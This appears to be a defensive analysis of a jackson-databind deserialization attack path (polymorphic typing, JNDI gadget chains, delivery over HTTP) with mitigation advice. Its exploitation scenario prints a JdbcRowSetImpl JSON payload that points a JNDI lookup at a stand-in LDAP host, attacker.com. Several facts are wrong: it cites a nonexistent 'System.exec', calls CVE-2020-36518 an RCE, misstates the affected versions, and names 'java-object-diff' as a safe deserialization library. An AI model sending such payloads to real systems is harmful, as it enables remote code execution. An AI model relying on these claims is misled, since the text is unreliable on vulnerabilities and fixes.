# Deep Analysis of jackson-databind Attack Tree Path

## 1. Objective, Scope, and Methodology

**1.1 Objective:**

The primary objective of this deep analysis is to thoroughly understand the specific attack path outlined in the provided attack tree, focusing on how an attacker can leverage vulnerabilities in `jackson-databind` to achieve Remote Code Execution (RCE) or data exfiltration.  We aim to identify the critical conditions, configurations, and code patterns that make this attack path viable, and to provide concrete recommendations for mitigation.  This analysis will go beyond a simple description of the vulnerabilities and delve into the practical exploitation techniques.

**1.2 Scope:**

This analysis focuses exclusively on the following attack path:

*   **Attacker's Goal:** RCE or Data Exfiltration via `jackson-databind`
*   **Exploit Deserialization Vulnerabilities:**  The general attack vector.
*   **Polymorphic Type Handling (PTH) Abuse:** The core vulnerability mechanism.
*   **JNDI:** A key component often used in gadget chains.
*   **CVE-XXX (and other CVEs):**  Specific, known vulnerabilities.
*   **Enable Default Typing:** A highly dangerous configuration.
*   **No Type Validation:**  The lack of security checks.
*   **System.exec (and ProcessBuilder):**  Methods for achieving RCE.
*   **HTTP Request:**  The delivery mechanism for the malicious payload.

We will *not* cover other potential attack vectors against the application, nor will we delve into vulnerabilities unrelated to `jackson-databind`.  We will assume the application uses a vulnerable version of `jackson-databind` and is configured in a way that makes it susceptible to this attack.

**1.3 Methodology:**

This analysis will employ the following methodology:

1.  **Vulnerability Research:**  We will research known CVEs related to `jackson-databind`, focusing on those involving Polymorphic Type Handling and JNDI exploitation.  We will examine public exploit PoCs (Proof of Concepts) and vulnerability reports.
2.  **Code Analysis:** We will analyze the relevant parts of the `jackson-databind` source code (available on GitHub) to understand the underlying mechanisms that enable the vulnerabilities.
3.  **Gadget Chain Analysis:** We will investigate common gadget chains used in `jackson-databind` exploits, paying particular attention to those involving JNDI lookups.
4.  **Configuration Analysis:** We will analyze the impact of different `jackson-databind` configuration options, particularly `enableDefaultTyping` and the absence of type validation.
5.  **Exploitation Scenario Construction:** We will construct a realistic exploitation scenario, demonstrating how an attacker could craft a malicious JSON payload and deliver it via an HTTP request.
6.  **Mitigation Recommendation:** We will provide specific, actionable recommendations for mitigating the vulnerabilities and preventing this attack path.

## 2. Deep Analysis of the Attack Tree Path

**2.1 Attacker's Goal: RCE or Data Exfiltration**

The attacker's ultimate goal is to compromise the application's security.  RCE is the more common and impactful goal, as it allows the attacker to execute arbitrary commands on the server, potentially leading to complete system takeover. Data exfiltration, while also serious, is often a secondary objective or a consequence of RCE.

**2.2 Exploit Deserialization Vulnerabilities**

Deserialization is the process of converting data (e.g., JSON, XML) into objects that the application can use.  `jackson-databind` is a powerful library for this purpose, but its flexibility also introduces security risks.  The core issue is that deserialization can be tricked into creating objects of unexpected types, potentially leading to the execution of malicious code.

**2.3 Polymorphic Type Handling (PTH) Abuse**

PTH is the heart of many `jackson-databind` vulnerabilities.  It allows Jackson to deserialize data into objects of different types based on type information included in the data itself (e.g., a `@type` property in JSON).  This is intended for legitimate use cases, such as deserializing a list of objects where each object might be a different subclass of a common base class.

However, attackers can abuse PTH by providing malicious type information.  They can specify a class that, when instantiated, triggers unintended behavior, such as loading remote code or executing system commands.  This is where "gadget chains" come into play.

**2.4 JNDI (Java Naming and Directory Interface)**

JNDI is a Java API for accessing naming and directory services.  It's often used to look up resources, such as database connections or remote objects.  In the context of `jackson-databind` exploits, JNDI is frequently used as part of a gadget chain.

The attacker crafts a malicious JSON payload that instructs Jackson to deserialize an object that uses JNDI to look up a remote object.  This remote object is controlled by the attacker and contains malicious code.  When the JNDI lookup occurs, the attacker's code is executed on the server.  A common example is using JNDI to connect to a malicious LDAP server.

**2.5 CVE-XXX (and other CVEs)**

Numerous CVEs have been identified in `jackson-databind` and related libraries that exploit PTH and JNDI.  Some notable examples include:

*   **CVE-2017-7525:**  A classic example of a `jackson-databind` vulnerability that allows RCE via JNDI.
*   **CVE-2019-12384:**  Another RCE vulnerability related to PTH.
*   **CVE-2020-36518:** Affects versions before 2.12.0, allows RCE.

These CVEs often have publicly available exploit PoCs, making them attractive targets for attackers.  Staying up-to-date with security patches is crucial.

**2.6 Enable Default Typing**

`enableDefaultTyping` is a configuration option in `jackson-databind` that, when enabled, allows Jackson to deserialize data into objects of *any* type, even if the application code doesn't explicitly expect it.  This is *extremely* dangerous when dealing with untrusted data, as it essentially disables most of Jackson's built-in security checks.  It should **never** be used with untrusted input.

**2.7 No Type Validation**

Even without `enableDefaultTyping`, the absence of any type validation or whitelisting makes exploitation much easier.  If the application doesn't restrict the types of objects that can be deserialized, the attacker has a much wider range of potential gadget chains to choose from.  Implementing a strict whitelist of allowed types is a critical security measure.

**2.8 System.exec (and ProcessBuilder)**

These are Java methods for executing system commands.  They represent the final step in achieving RCE.  The attacker's gadget chain will ultimately lead to the execution of one of these methods, with a command of the attacker's choosing.  For example, the attacker might execute a command to download and run a malicious script, establish a reverse shell, or exfiltrate data.

**2.9 HTTP Request**

This is the most common way for an attacker to deliver the malicious JSON payload to the vulnerable application.  The attacker might send a POST request with the payload in the request body, or they might embed the payload in a URL parameter.  The application then uses `jackson-databind` to deserialize the payload, triggering the exploit.

**2.10 Exploitation Scenario Example**

1.  **Vulnerable Application:** An application uses a vulnerable version of `jackson-databind` (e.g., 2.9.9) and is configured to accept JSON input via an HTTP POST request to `/api/processData`.  The application does *not* use `enableDefaultTyping`, but it also does *not* implement any type validation.
2.  **Attacker's Payload:** The attacker crafts a malicious JSON payload that exploits a known `jackson-databind` vulnerability (e.g., CVE-2017-7525).  The payload uses PTH to specify a class that triggers a JNDI lookup to a malicious LDAP server controlled by the attacker.  The payload might look something like this (simplified for illustration):

    ```json
    [
      "com.sun.rowset.JdbcRowSetImpl",
      {
        "dataSourceName": "ldap://attacker.com:1389/Exploit",
        "autoCommit": true
      }
    ]
    ```
3.  **Delivery:** The attacker sends an HTTP POST request to `/api/processData` with the malicious JSON payload in the request body.
4.  **Deserialization:** The application receives the request and uses `jackson-databind` to deserialize the JSON payload.
5.  **JNDI Lookup:**  `jackson-databind` instantiates the `com.sun.rowset.JdbcRowSetImpl` class.  The `dataSourceName` property triggers a JNDI lookup to the attacker's LDAP server.
6.  **RCE:** The attacker's LDAP server responds with a malicious object that, when deserialized, executes arbitrary code on the server (e.g., using `System.exec` to start a reverse shell).

## 3. Mitigation Recommendations

The following recommendations are crucial for mitigating the vulnerabilities and preventing this attack path:

1.  **Update `jackson-databind`:**  The most important step is to update to the latest version of `jackson-databind`.  Patches are regularly released to address known vulnerabilities.  Ensure you are using a version that is not vulnerable to any known CVEs.
2.  **Disable `enableDefaultTyping`:**  Never use `enableDefaultTyping` with untrusted data.  This is a critical security measure.
3.  **Implement Type Whitelisting:**  Implement a strict whitelist of allowed types for deserialization.  This is the most effective way to prevent PTH abuse.  Only allow the specific classes that your application legitimately needs to deserialize.  Use `@JsonTypeInfo` with `use = JsonTypeInfo.Id.CLASS` or `use = JsonTypeInfo.Id.NAME` and specify a `include = JsonTypeInfo.As.PROPERTY` or `include = JsonTypeInfo.As.WRAPPER_OBJECT` and a custom `TypeResolverBuilder` or `@JsonTypeResolver` to control the allowed types.
4.  **Use a Safe Deserialization Library (if possible):** Consider using a library specifically designed for safe deserialization, such as `java-object-diff` or a custom solution that performs strict type checking.
5.  **Input Validation:**  Validate all user input, including JSON data, before passing it to `jackson-databind`.  This can help prevent other types of injection attacks.
6.  **Least Privilege:**  Run the application with the least privileges necessary.  This limits the damage an attacker can do if they achieve RCE.
7.  **Security Audits:**  Regularly conduct security audits and penetration testing to identify and address vulnerabilities.
8. **Web Application Firewall (WAF):** Use a WAF to filter malicious traffic and block known exploit attempts.
9. **Monitor and Alert:** Implement robust logging and monitoring to detect suspicious activity, such as unexpected JNDI lookups or unusual system commands.

By implementing these recommendations, you can significantly reduce the risk of RCE and data exfiltration via `jackson-databind` vulnerabilities.  The key is to be proactive, stay up-to-date with security patches, and implement strong security controls throughout the application.
